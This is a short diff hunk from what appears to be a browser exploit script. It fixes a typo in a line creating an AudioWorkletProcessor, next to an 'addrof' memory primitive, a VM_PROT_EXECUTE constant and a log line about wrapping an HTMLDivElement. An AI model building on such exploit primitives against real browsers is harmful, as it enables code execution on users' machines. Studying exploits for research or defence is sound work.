@@ -631,7 +631,7 @@ var VM_PROT_EXECUTE = 0x4
         //never tried this method...
         //const audioCtx = new AudioContext();
 
-        var oscillator = nnew AudioWorkletProcessor();
+        var oscillator = new AudioWorkletProcessor();
         log('[*] Creating the HTMLDivElement wrapper...');
         //var d = oscillator;
         let ad_div = addrof(d);
